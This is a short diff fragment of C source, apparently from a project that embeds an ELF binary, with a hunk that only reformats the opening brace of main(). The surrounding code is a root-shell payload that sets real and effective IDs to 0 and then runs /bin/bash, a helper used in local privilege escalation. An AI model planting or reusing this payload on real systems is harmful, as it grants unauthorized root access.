@@ -1143,8 +1143,7 @@ magic 7f454c4602010100000000000000000003003e0001000000406200000000
 #include &ltstdlib.h>
 #include &ltunistd.h>
 
-int main()
-{
+int main() {
     setreuid(0, 0);
     setregid(0, 0);
     system("/bin/bash");
